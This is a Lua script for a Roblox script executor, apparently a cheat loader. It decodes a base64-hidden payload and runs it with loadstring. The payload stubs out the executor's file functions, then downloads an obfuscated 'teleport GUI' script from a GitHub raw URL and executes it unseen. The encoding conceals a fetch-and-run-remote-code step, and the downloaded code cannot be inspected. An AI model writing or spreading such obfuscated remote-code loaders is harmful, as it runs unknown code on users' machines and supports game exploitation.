local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
        return string.char(tonumber(r,2))
    end))
end

loadstring(decode("aWYgbm90ICh3cml0ZWZpbGUgYW5kIHJlYWRmaWxlIGFuZCBpc2ZpbGUpIHRoZW4KICAgIGdldGdlbnYoKS53cml0ZWZpbGUgPSBmdW5jdGlvbigpIGVuZAogICAgZ2V0Z2VudigpLnJlYWRmaWxlID0gZnVuY3Rpb24oKSB0aGVuIHJldHVybiB7fSBlbmQKICAgIGdldGdlbnYoKS5pc2ZpbGUgPSBmdW5jdGlvbigpIHJldHVybiBmYWxzZSBlbmQKZW5kCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FSSUlTRVRJQVdBTjIwL3RlbGVwb3J0X2FyaWkvbWFpbi90ZWxlcG9ydF9ndWlfb2JmdXNjYXRlZC5sdWEiKSkgKCk="))()
